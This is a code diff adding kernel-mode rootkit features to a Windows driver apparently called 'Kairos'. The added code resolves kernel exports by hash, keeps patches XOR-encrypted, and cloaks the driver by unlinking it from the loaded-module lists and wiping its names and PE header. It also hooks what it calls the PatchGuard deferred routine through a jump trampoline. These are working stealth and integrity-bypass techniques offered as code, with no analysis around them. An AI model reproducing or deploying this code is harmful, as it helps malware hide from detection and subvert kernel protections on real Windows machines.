@@ -41,13 +41,63 @@ UCHAR OriginalBytes[16] = {0};
 UCHAR PatchedBytes[16]  = { /* your hook or patch */ };
 PVOID PatchAddress      = NULL;  // Set this!
 
+typedef struct _ENCRYPTED_PATCH_ENTRY {
+    PVOID TargetAddress;
+    UCHAR EncryptedPatch[16];
+    UCHAR OriginalBytes[16];
+    BOOLEAN Active;
+    UCHAR XorKey;
+} ENCRYPTED_PATCH_ENTRY;
+
+#define MAX_PATCHES 8
+ENCRYPTED_PATCH_ENTRY g_PatchVault[MAX_PATCHES] = { 0 };
+
+ULONG HashSymbol(PCSTR name) {
+    ULONG hash = 5381;
+    while (*name) {
+        hash = ((hash << 5) + hash) + *name++;
+    }
+    return hash;
+}
+
+PVOID ResolveKernelSymbolByHash(ULONG expectedHash) {
+    PVOID kernelBase = GetKernelBase();
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)kernelBase;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)kernelBase + dos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
+        (PUCHAR)kernelBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD names = (PDWORD)((PUCHAR)kernelBase + exportDir->AddressOfNames);
+    PDWORD functions = (PDWORD)((PUCHAR)kernelBase + exportDir->AddressOfFunctions);
+    PWORD ordinals = (PWORD)((PUCHAR)kernelBase + exportDir->AddressOfNameOrdinals);
+
+    for (ULONG i = 0; i < exportDir->NumberOfNames; i++) {
+        PCSTR name = (PCSTR)(kernelBase + names[i]);
+        ULONG hash = HashSymbol(name);
+
+        if (hash == expectedHash) {
+            USHORT ordinal = ordinals[i];
+            return (PVOID)((PUCHAR)kernelBase + functions[ordinal]);
+        }
+    }
+
+    return NULL;
+}
+
 VOID RegisterPatch(PVOID addr, PUCHAR patch, SIZE_T len) {
     for (int i = 0; i < MAX_PATCHES; i++) {
-        if (!g_PatchList[i].Active) {
-            g_PatchList[i].TargetAddress = addr;
-            RtlCopyMemory(g_PatchList[i].Patch, patch, len);
-            RtlCopyMemory(g_PatchList[i].Original, addr, len);
-            g_PatchList[i].Active = TRUE;
+        if (!g_PatchVault[i].Active) {
+            UCHAR key = (UCHAR)__rdtsc();  // Simple entropy
+
+            g_PatchVault[i].TargetAddress = addr;
+            RtlCopyMemory(g_PatchVault[i].OriginalBytes, addr, len);
+
+            for (SIZE_T j = 0; j < len; j++) {
+                g_PatchVault[i].EncryptedPatch[j] = patch[j] ^ key;
+            }
+
+            g_PatchVault[i].XorKey = key;
+            g_PatchVault[i].Active = TRUE;
             break;
         }
     }
@@ -67,6 +117,27 @@ VOID ReapplyKernelPatch() {
         if (g_PatchList[i].Active) {
             RtlCopyMemory(g_PatchList[i].TargetAddress,
                           g_PatchList[i].Patch, sizeof(g_PatchList[i].Patch));
+        }
+    }
+}
+
+VOID ApplyEncryptedPatches() {
+    for (int i = 0; i < MAX_PATCHES; i++) {
+        if (g_PatchVault[i].Active) {
+            UCHAR decrypted[16] = { 0 };
+            for (int j = 0; j < 16; j++) {
+                decrypted[j] = g_PatchVault[i].EncryptedPatch[j] ^ g_PatchVault[i].XorKey;
+            }
+
+            RtlCopyMemory(g_PatchVault[i].TargetAddress, decrypted, sizeof(decrypted));
+        }
+    }
+}
+
+VOID RevertEncryptedPatches() {
+    for (int i = 0; i < MAX_PATCHES; i++) {
+        if (g_PatchVault[i].Active) {
+            RtlCopyMemory(g_PatchVault[i].TargetAddress, g_PatchVault[i].OriginalBytes, sizeof(g_PatchVault[i].OriginalBytes));
         }
     }
 }
@@ -441,4 +512,112 @@ VOID WalkStackTrace(VOID) {
 if (Dpc && Dpc->DeferredRoutine) {
     DebugLog("New DPC queued: %p\n", Dpc->DeferredRoutine);
     WalkStackTrace();  // Identify who queued the DPC
+}
+
+VOID CloakKairosDriver(PDRIVER_OBJECT DriverObject) {
+    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
+
+    if (!entry) return;
+
+    // 1. Unlink from PsLoadedModuleList
+    RemoveEntryList(&entry->InLoadOrderLinks);
+    RemoveEntryList(&entry->InMemoryOrderLinks);
+    RemoveEntryList(&entry->InInitializationOrderLinks);
+
+    // 2. Overwrite fields in LDR entry
+    RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
+    RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
+    entry->FullDllName.Length = 0;
+    entry->BaseDllName.Length = 0;
+
+    // 3. Null references
+    entry->DllBase = NULL;
+    entry->EntryPoint = NULL;
+    entry->SizeOfImage = 0;
+
+    // 4. Cloak DriverObject fields
+    RtlZeroMemory(DriverObject->DriverName.Buffer, DriverObject->DriverName.Length);
+    DriverObject->DriverName.Length = 0;
+
+    // 5. Wipe PE header
+    PUCHAR base = (PUCHAR)DriverObject->DriverStart;
+    if (!MmIsAddressValid(base)) return;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
+
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+
+    SIZE_T headerSize = nt->OptionalHeader.SizeOfHeaders;
+    RtlFillMemory(base, headerSize, 0);
+
+    DebugLog("Kairos driver cloaked: LDR unlinked + PE header wiped.");
+}
+
+PVOID AllocateTrampoline(PVOID target, PVOID redirect) {
+    PUCHAR stub = ExAllocatePoolWithTag(NonPagedPoolExecute, 32, 'trap');
+    if (!stub) return NULL;
+
+    // mov rax, redirect_addr
+    stub[0] = 0x48;
+    stub[1] = 0xB8;
+    *(PVOID*)&stub[2] = redirect;
+
+    // jmp rax
+    stub[10] = 0xFF;
+    stub[11] = 0xE0;
+
+    return stub;
+}
+
+typedef struct _PATCHED_ROUTINE {
+    PVOID OriginalFunction;
+    UCHAR OriginalBytes[16];
+    SIZE_T Length;
+    BOOLEAN Active;
+} PATCHED_ROUTINE;
+
+PATCHED_ROUTINE g_HookedPgRoutine = { 0 };
+
+VOID HookPgDeferredRoutine(PVOID originalRoutine, PVOID trampoline) {
+    if (!originalRoutine || !trampoline) return;
+
+    SIZE_T patchLen = 12;  // size of our stub
+
+    // Save original bytes
+    RtlCopyMemory(g_HookedPgRoutine.OriginalBytes, originalRoutine, patchLen);
+    g_HookedPgRoutine.OriginalFunction = originalRoutine;
+    g_HookedPgRoutine.Length = patchLen;
+    g_HookedPgRoutine.Active = TRUE;
+
+    // Enable write
+    PMDL mdl = IoAllocateMdl(originalRoutine, patchLen, FALSE, FALSE, NULL);
+    MmBuildMdlForNonPagedPool(mdl);
+    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+    // Overwrite with jump to trampoline
+    RtlCopyMemory(mapped, trampoline, patchLen);
+
+    MmUnmapLockedPages(mapped, mdl);
+    IoFreeMdl(mdl);
+
+    DebugLog("PG routine hooked via trampoline.");
+}
+
+VOID UnhookPgDeferredRoutine() {
+    if (!g_HookedPgRoutine.Active) return;
+
+    PMDL mdl = IoAllocateMdl(g_HookedPgRoutine.OriginalFunction, g_HookedPgRoutine.Length, FALSE, FALSE, NULL);
+    MmBuildMdlForNonPagedPool(mdl);
+    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+    RtlCopyMemory(mapped, g_HookedPgRoutine.OriginalBytes, g_HookedPgRoutine.Length);
+
+    MmUnmapLockedPages(mapped, mdl);
+    IoFreeMdl(mdl);
+
+    g_HookedPgRoutine.Active = FALSE;
+
+    DebugLog("PG routine unhooked.");
 }
